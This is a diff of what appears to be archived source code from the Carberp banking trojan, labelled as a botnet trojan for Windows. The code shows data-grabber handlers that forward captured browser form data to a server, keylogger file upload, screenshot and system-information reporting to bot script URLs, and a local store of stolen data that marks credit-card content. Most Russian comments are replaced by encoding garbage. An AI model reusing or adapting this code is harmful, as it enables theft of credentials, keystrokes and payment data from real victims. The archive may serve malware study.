@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <winsock2.h>
 #include <windows.h>
 #include <wininet.h>
@@ -26,12 +37,12 @@ namespace LDBGTEMPLATES
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define LDBG LDBGTEMPLATES::DBGOutMessage<>
 
 
 
-//  Определяем необходимость получения от сервера ошибок
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 #if defined(DEBUGCONFIG) || defined(BOTMONITOR)
 
 	#define LOADER_GET_ERROR
@@ -54,24 +65,24 @@ char HTTPFieldUID[] = {'u','i','d', 0};
 
 typedef struct TSendDataHandler
 {
-	PCHAR HandleURL;       // Адрес который необходимо обработать
-	PCHAR URL; 			   // Рабочий адрес
-	PSendDataEvent Event;  // Событие обработки
-	THandleDataMode Mode;  // Режим обработки
+	PCHAR HandleURL;       // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	PCHAR URL; 			   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	PSendDataEvent Event;  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	THandleDataMode Mode;  // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 } *PSendDataHandler;
 
 
 bool bSBStarted;
 
-// Список зарегистрированных обработчиков отправки данных
-HANDLE SendHandlersTID = NULL;  //  Инициализауию глобальных данных буднм
-				        	   //  привязывать к идентификатору потока
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+HANDLE SendHandlersTID = NULL;  //  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+				        	   //  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 PList SendDataHandlers = NULL;
 
 
 void DestroyDataHandler(LPVOID Data)
 {
-	// Уничтожить данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PSendDataHandler H =  (PSendDataHandler)Data;
 	STR::Free(H->HandleURL);
 	STR::Free(H->URL);
@@ -81,8 +92,8 @@ void DestroyDataHandler(LPVOID Data)
 
  void InitializeHandlersList()
 {
-	// Инициализацию списка перехватчиков производим в случае если
-	// он не создал либо создан в другом процессе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HANDLE TID = (HANDLE)pGetCurrentThreadId();
 
 	if (SendDataHandlers == NULL || SendHandlersTID != TID)
@@ -96,7 +107,7 @@ void DestroyDataHandler(LPVOID Data)
 
 DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL)
 {
-	// Зарегистрировать обработчик отправки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Event == NULL && Mode == hdmUnknown)
 		return 0;
 
@@ -124,7 +135,7 @@ void CallSendDataHandlers(PSendHTMLData Data, bool &Cancel)
 		return;
 
 
-	// Вызвать обработчики отправки данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Count = List::Count(SendDataHandlers);
 	PSendDataHandler Handler;
 
@@ -132,15 +143,15 @@ void CallSendDataHandlers(PSendHTMLData Data, bool &Cancel)
 
 	for (DWORD i = 0; i < Count; i++)
 	{
-		// Получаем новый обработчик
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Handler = (PSendDataHandler)List::GetItem(SendDataHandlers, i);
 
-		// Проверяем адрес
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		DWORD Tm;
 		if (Handler->HandleURL != NULL && !WildCmp(Data->URL, Handler->HandleURL, &Tm, &Tm, &Tm))
 			continue;
 
-		// Вызываем событие
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		IgnoreHandler = false;
 		if (Handler->Event != NULL)
 		{
@@ -151,10 +162,10 @@ void CallSendDataHandlers(PSendHTMLData Data, bool &Cancel)
 		if (IgnoreHandler)
 			continue;
 
-		// Обрабатываем режим
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (Handler->Mode != hdmUnknown && Handler->URL != NULL)
 		{
-			// Отправляем данные на сервер
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			DataGrabber::SendHTMLDataToServer(Handler->URL, Data, NULL);
 			if (Handler->Mode == hdmRedirect)
 			{
@@ -812,11 +823,11 @@ bool ExecuteFile( char *Url, WCHAR *FileName )
 
 bool CheckValidPostResult(PHTTPResponseRec Response, PCHAR HTMLDocument)
 {
-	// Функция проверяет ответ сервера и возвращает истину если сервер успешно
-	// принял отправленные данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// В данный момент сервер сигнализирует об успешном приёме данных
-	// отправкой ответа с кодом 403
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ 403
 	return Response->Code == 403;
 }
 
@@ -824,7 +835,7 @@ bool CheckValidPostResult(PHTTPResponseRec Response, PCHAR HTMLDocument)
 
 bool SendRemoteLog(PCHAR Type, PCHAR Log, LPBYTE ScreenShot, DWORD ScreenSize, PCHAR ScreenExt)
 {
-	// Функция отправляет лог на скрипт удалённого логирования
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(Type) || (Log == NULL && ScreenShot == NULL))
 		return false;
 
@@ -835,7 +846,7 @@ bool SendRemoteLog(PCHAR Type, PCHAR Log, LPBYTE ScreenShot, DWORD ScreenSize, P
 
 	PMultiPartData Data = MultiPartData::Create();
 
-	// Заполняем набор данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	char FieldLog[]  = {'d','e','s','c', 0};
 	char FieldType[] = {'t','y','p','e', 0};
@@ -849,7 +860,7 @@ bool SendRemoteLog(PCHAR Type, PCHAR Log, LPBYTE ScreenShot, DWORD ScreenSize, P
 
 	if (ScreenShot != NULL && ScreenSize > 0)
 	{
-		// Добавляем скриншот
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         char FieldScreen[] = {'s','c','r','e','e','n', 0};
 
 		char FileName[] = {'S','c','r','e','e','n', 0};
@@ -865,7 +876,7 @@ bool SendRemoteLog(PCHAR Type, PCHAR Log, LPBYTE ScreenShot, DWORD ScreenSize, P
 		STR::Free(FN);
 	}
 
-	// Отправляем запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 
@@ -873,7 +884,7 @@ bool SendRemoteLog(PCHAR Type, PCHAR Log, LPBYTE ScreenShot, DWORD ScreenSize, P
 	if (Result)
 		Result = CheckValidPostResult(&Response, NULL);
 
-	// Уничтожаем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	MultiPartData::Free(Data);
 	STR::Free(URL);
 	STR::Free(UID);
@@ -888,7 +899,7 @@ bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize)
 	if (STR::IsEmpty(URL) || Buf == NULL || BufSize == 0)
 		return false;
 
-	// Собираем  данные сниффера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR BotID = GenerateBotID();
 
@@ -920,7 +931,7 @@ bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize)
 
 bool SendFirstInfo()
 {
-	// Функция отправляет информацию о системе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Script = GetBotScriptURL(SCRIPT_FIRST_INFO);
 	if (Script == NULL)
 		return false;
@@ -929,7 +940,7 @@ bool SendFirstInfo()
 	PCHAR ProcList = GetProcessList();
 	PCHAR ID = GenerateBotID();
 
-    // Формируем POST данные
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ
 	PStrings Fields = Strings::Create();
 
 	AddURLParam(Fields, "id", ID);
@@ -941,7 +952,7 @@ bool SendFirstInfo()
 	MemFree(ProcList);
 	STR::Free(ID);
 
-	// Лтправляем запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef CryptHTTPH
 		PCHAR Password = GetMainPassword();
 		bool Result = CryptHTTP::Post(Script, Password, Fields, NULL, NULL);;
@@ -1215,7 +1226,7 @@ char *GetInfoFromBcServer( char *Url )
 
 //DWORD WINAPI SendBSSInist( LPVOID lpData )
 //{
-//	// Функция отправляет лог системы BSS
+//	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ BSS
 //	#ifdef HunterH
 //		HANDLE tmp;
 //		tmp= (HANDLE)pCreateMutexA(NULL,FALSE,"Hnt");
@@ -1405,7 +1416,7 @@ char *GetInfoFromBcServer( char *Url )
 
 
 //****************************************************************************
-//  DataGrabber - Функции для работы с отправляемыми данными
+//  DataGrabber - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //****************************************************************************
 
 
@@ -1423,11 +1434,11 @@ namespace DataSender
 
 	void ProcessDataFile(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
 	{
-		// Обрабатываем найденный файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		PStrings Files = (PStrings)Data;
 		if (Strings::IndexOf(Files, FileName) >= 0)
 			return;
-		LDBG("Loader", "Обрабатываем файл данных %s", FileName);
+		LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", FileName);
 
 		bool Invalid = false;
 		bool Sended = DataGrabber::SendDataFile(FileName, &Invalid);
@@ -1441,12 +1452,12 @@ namespace DataSender
 		void ProcessKeyLogFile(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
 		{
 
-			// Обрабатываем файлы кейлогера
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			PStrings Files = (PStrings)Data;
 			if (Strings::IndexOf(Files, FileName) >= 0)
 				return;
 
-			// Отправляем файл
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			bool Invalid = false;
 			if (!KeyLogger::CanSendLoggerFile(FileName, &Invalid))
 			{
@@ -1456,19 +1467,19 @@ namespace DataSender
 			}
 
 
-			LDBG("Loader", "Отправляем файл кейлогера %s", FileName);
+			LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", FileName);
 
 
 			Invalid = false;
 			bool Sended = KeyLogger::SendLoggerFile(FileName, &Invalid);
 
-			// создаём каб архив
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			if (Sended || Invalid)
 			{
-				// В случае успешной отправки файла добавляем его в список
-				// удаления
+				// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				if (Sended)
-					LDBG("Loader", "Файл успешно отправлен");
+					LDBG("Loader", "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 				Strings::Add(Files, FileName);
 			}
@@ -1479,7 +1490,7 @@ namespace DataSender
 
 	void DeleteFiles(PStrings Files)
 	{
-		// Удалить файлы из списка
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD Count = Strings::Count(Files);
 		int Max = 15;
 		while (Count > 0)
@@ -1503,23 +1514,23 @@ namespace DataSender
     //------------------------------------------------------------------------
 	DWORD WINAPI DataSenderThreadProc(LPVOID)
 	{
-		// процедура мониторинга за хранилишем отправляемых данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		#ifdef BV_APP
-			// зАДЕРЖКА ДЛЯ ОТЛАДОЧНОГО ПРИЛОЖЕНИЯ
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pSleep(1000);
 		#endif
 
-        LDBG("Loader", "Поток отправки данных запущен");
+        LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 		PCHAR Path = DataGrabber::GetRepositoryPath();
 
 		if (Path == NULL)
 			pExitThread(0);
 
-		// Ставим задержку перед запуском
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PStrings Files = Strings::Create();
 
-		// Запускаем бесконечный цикл мониторинга за хранилищем
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		#ifndef DEBUGBOT
 			const static DWORD WaitInterval = 1*60*1000;
 		#else
@@ -1527,27 +1538,27 @@ namespace DataSender
     	#endif
 
 #ifdef GrabbersH
-        TGrabberFileSender GrabberFiles; // Новая версия грабера
+        TGrabberFileSender GrabberFiles; // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #endif
 
 		while (1)
 		{
-			LDBG("Loader", "Обрабатываем хранилище отправляемых данных");
+			LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
-			// Отправляем новые логи
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 #ifdef GrabbersH
             GrabberFiles.SendFiles();
 #endif
 
-			// Отправляем файлы грабера
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			SearchFiles(Path, (PCHAR)DataFileMask, false, FA_ANY_FILES, Files, ProcessDataFile);
 
-			// Отправляем файлы кейлогера
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			#ifdef UniversalKeyLoggerH
                	SearchFiles(Path, (PCHAR)KeyLogFileMask, false, FA_ANY_FILES, Files, ProcessKeyLogFile);
 			#endif
 
-            // Удаляем отправленные файлы
+            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			DeleteFiles(Files);
 
 
@@ -1558,10 +1569,10 @@ namespace DataSender
 	}
 }
 
-// Функция возвращает путь к папке хранилища данных
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 PCHAR DataGrabber::GetRepositoryPath()
 {
-	 // Функция возвращает путь к директории хранения данных приложений
+	 // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Tmp = BOT::GetWorkPath("DSStor", NULL);
 	PCHAR Path = STR::New(2, Tmp, "\\");
 	STR::Free(Tmp);
@@ -1572,7 +1583,7 @@ PCHAR DataGrabber::GetRepositoryPath()
 
 PCHAR DataGrabber::GetDataFileName(PCHAR FileName)
 {
-	// Функция возвращает уникальное имя файла для хранения данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Path = GetRepositoryPath();
 	if (Path == NULL)
 		return NULL;
@@ -1593,8 +1604,8 @@ PCHAR DataGrabber::GetDataFileName(PCHAR FileName)
 
 PCHAR DataGrabber::GetKeyLoggerFileName()
 {
-	// Функция возвращает имя файла для хранения данных кейлогера
-	// Функция возвращает уникальное имя файла для хранения данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Path = GetRepositoryPath();
 	if (Path == NULL)
 		return NULL;
@@ -1627,14 +1638,14 @@ PCHAR DataGrabber::GetKeyLoggerFileName()
 
 PCHAR DataGrabber::GetRepositoryPassword()
 {
-	// Функция возвращает пароль, которым будут шифроваться файлы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	return GenerateBotID();
 }
 
 
 PDataFile DataGrabber::CreateDataFile(DWORD DataType)
 {
-	// Создать файл данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR FileName = GetDataFileName();
 	if (FileName == NULL)
 		return false;
@@ -1659,8 +1670,8 @@ PDataFile DataGrabber::CreateDataFile(DWORD DataType)
 
 void DataGrabber::CloseDataFile(PDataFile File)
 {
-	// Создать файл данных
-	// Записываем данные и закрываем файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	DataFile::WriteDataFile(File);
 
 	STR::Free((PCHAR)File->CryptKey);
@@ -1670,7 +1681,7 @@ void DataGrabber::CloseDataFile(PDataFile File)
 
 	DataFile::CloseFile(File);
 
-    // Меняем расширение файлаЮ для последующей отправки
+    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
     PCHAR NewFileName = STR::New(2, FileName, DataFileExt);
 
@@ -1684,14 +1695,14 @@ void DataGrabber::CloseDataFile(PDataFile File)
 bool DataGrabber::AddData(PCHAR URL, PCHAR Data, PCHAR UserAgent,
 	DWORD Browser, DWORD DataType, bool ContainCreditCard)
 {
-	// Функция складывает данные в хранилище для последующей отправки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PDataFile File = CreateDataFile(DataType);
 
 	if (File == NULL) return false;
 
 
-	// Заполняем файл данными
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	File->Head.FlagsEx = Browser;
 
 	DataFile::AddDataBlock(File, DATA_BLOCK_URL, URL);
@@ -1712,7 +1723,7 @@ bool DataGrabber::AddData(PCHAR URL, PCHAR Data, PCHAR UserAgent,
 bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType)
 {
